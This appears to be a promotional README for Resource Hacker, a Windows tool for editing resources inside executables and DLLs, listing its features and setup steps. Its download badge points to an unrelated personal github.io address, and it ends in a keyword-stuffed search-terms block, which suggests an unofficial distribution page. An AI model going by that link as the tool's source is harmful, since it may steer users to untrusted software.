## [01] SYSTEM_MANIFEST & SCOPE

Resource Hacker is a specialized resource compiler, decompiler, and binary modification utility engineered for 32-bit and 64-bit Windows operating environments. Built to operate directly on Portable Executable (PE) files—including `.exe`, `.dll`, `.scr`, `.cpl`, and `.res` containers—it enables software developers, localizers, system engineers, and security analysts to inspect, extract, modify, and recompile embedded application assets without access to original source code.

[![Download Resource Hacker](https://img.shields.io/badge/Download-ResourceHacker-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://karenbrowne770.github.io/.github/ResourceHacker-Resource-Core)

Resource Hacker bridges low-level binary inspection with visual UI manipulation. It exposes embedded string tables, version manifests, dialog definitions, menu structures, icons, bitmaps, wave audio, and Delphi forms. Featuring both a standalone GUI workspace and a command-line scripting interface, it supports rapid application localization, UI theme customization, asset extraction, and automated build pipeline post-processing.

---

## [02] LOW_LEVEL_ARCHITECTURE

* **[PE_RESOURCE_DIRECTORY_PARSER]** : Navigates section headers (`.rsrc`) within 32/64-bit PE binary headers to map resource types, IDs, language tags, and data offsets.
* **[SCRIPT_DECOMPILER_ENGINE]** : Translates raw compiled binary dialog, menu, and string table structures into readable resource script code (`.rc`).
* **[RESOURCE_COMPILER_CORE]** : Features an internal resource script compiler that validates syntax and rebinds edited RC scripts into PE target binaries.
* **[MEDIA_EXTRACTION_PIPELINE]** : Dumps raw embedded graphics (`.ico`, `.bmp`, `.png`), media streams (`.wav`), and manifests into standalone disk files.
* **[CLI_AUTOMATION_DISPATCHER]** : Supports headless command-line script execution (`-open`, `-save`, `-action`, `-res`, `-mask`) for batch modifications in automated build workflows.

<img src="https://www.angusj.com/resourcehacker/rh_dlg_edit.png" alt="Program Interface Screenshot"/>

---

## [03] PARAMETRIC_SUBSYSTEM_MATRIX

| SUBSYSTEM_ID | INTERFACE_TECH | OPERATIONAL_BEHAVIOR |
| :--- | :--- | :--- |
| **PE_PARSER** | Win32 Memory Mapping API | Scans binary section tables to isolate and decode `.rsrc` structures safely. |
| **GUI_EDITOR** | Win32 Custom Dialog / TreeView | Renders visual previews for icons, bitmaps, string tables, and interactive dialog layouts. |
| **RC_COMPILER** | Embedded RC Parser | Compiles edited script text back into binary resource format with offset recalculation. |
| **MANIFEST_ED** | XML / UTF-8 Text Engine | Modifies application execution levels, DPI awareness, and side-by-side assembly dependencies. |
| **CLI_ENGINE** | Win32 Console Dispatcher | Executes headless batch resource replacements, deletions, and additions via CLI flags. |

---

## [04] DEPLOYMENT_AND_EXECUTION_PROTOCOL

1. **Host Environment Setup:**
   Confirm target workstation runs Windows NT operating environment with read/write access permissions to destination binaries.

2. **Package Acquisition:**
   Download the portable archive workspace or standalone setup binary (`ResourceHacker.exe`) from the official distribution channel.

3. **Software Execution:**
   Launch `ResourceHacker.exe` directly or integrate its CLI binary into script pipelines.

4. **Resource Modification Execution:**
   Open a target binary (`.exe` or `.dll`), navigate the tree hierarchy to inspect embedded resources, edit resource scripts or replace visual assets, compile the changes, and save the updated binary file.

---

### SEARCH TERMS
Resource Hacker Windows • PE resource editor • binary resource modifier • exe icon changer • dll resource editor • resource compiler decompiler • Windows dialog layout editor • string table editor • extract executable assets • version info manifest editor • win32 resource editor • portable executable parser • batch resource hacker script • edit exe binary assets • resource script compiler
